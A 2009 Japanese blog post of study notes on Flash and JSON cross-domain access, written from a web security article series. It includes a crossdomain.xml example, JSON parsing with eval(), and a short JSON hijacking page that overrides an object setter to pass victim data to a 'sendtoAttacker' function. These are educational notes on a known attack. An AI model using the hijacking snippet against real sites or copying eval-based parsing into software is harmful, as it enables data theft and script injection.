---
layout: post
title: 'Flash，JSONでのクロスドメインアクセス勉強メモ'
date: 2009-11-24
wordpress_id: 320
permalink: /blog/memo-of-flash-json-cross-domain
comments: true
categories: Flash
---
gihyoサイトの「ここが危ない！Web2.0のセキュリティ」連載の<a href="http://gihyo.jp/dev/serial/01/web20sec/0004" target="_blank">第4回：「Flash，JSONでのクロスドメインアクセス」の</a>勉強メモです。

## Flashのクロスドメインアクセス
### 動作原理
データ提供側で認証のファイルを設置するだけです。
ファイル名は「crossdomain.xml」で、これが例なのかこう書かなければならないのかは明確に書いてません。

```xml
<cross-domain-policy>
	<allow-access-from domain="www.securesky-tech.com" />
</cross-domain-policy>
```

## JSONでも実はクロスドメインアクセスが可能
### 動作原理
eval()関数でデータを評価するだけで使用可能になる

```js
var obj = eval("("+req.responseText+")");
```

### クロスドメインの実現
setterメソッドをサポートしているブラウザ（FirefoxやSafari 3等）では，setterメソッドを再定義することによって，JSONもSCRIPTタグで呼び出して使うことが可能になる。

```html
<html>
	<script>
		Object.prototype.__defineSetter__('name', function(x){sendtoAttacker(x);});
	</script>
	<script src="http://www.securesky-tech.com/object.dat">
	</script>
</html>
```